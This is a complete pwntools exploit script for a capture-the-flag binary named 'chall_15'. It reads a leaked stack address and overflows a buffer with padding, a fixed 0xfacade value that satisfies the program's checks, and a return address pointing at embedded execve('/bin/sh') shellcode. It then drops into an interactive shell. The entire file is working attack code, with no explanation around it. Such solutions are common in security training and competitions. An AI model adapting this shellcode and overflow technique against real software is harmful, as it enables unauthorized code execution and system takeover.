# coding: utf-8
from pwn import *
binary=ELF("./chall_15")
p=process("./chall_15")
p.sendline()
resp=p.recv()
addr=int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16)
shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = b"A"*(0x46-0x3c)+p32(0xfacade)+shellcode
payload+=b"A"*(0x46-0x4-len(payload))+p32(0xfacade)
payload+=b"A"*(0x46+0x8-len(payload))+p64(addr+14)
p.sendline(payload)
p.interactive()
